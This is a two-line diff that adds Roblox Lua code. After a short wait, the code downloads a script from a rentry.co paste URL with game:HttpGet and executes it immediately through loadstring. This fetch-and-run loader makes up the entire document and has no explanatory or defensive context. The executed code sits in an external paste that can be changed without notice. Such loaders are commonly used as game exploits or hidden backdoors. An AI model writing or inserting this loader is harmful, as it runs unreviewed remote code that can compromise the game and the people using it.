@@ -1,0 +1,2 @@
+wait (0.2)
+loadstring(game:HttpGet('https://rentry.co/fs6w3pw2/raw',true))()
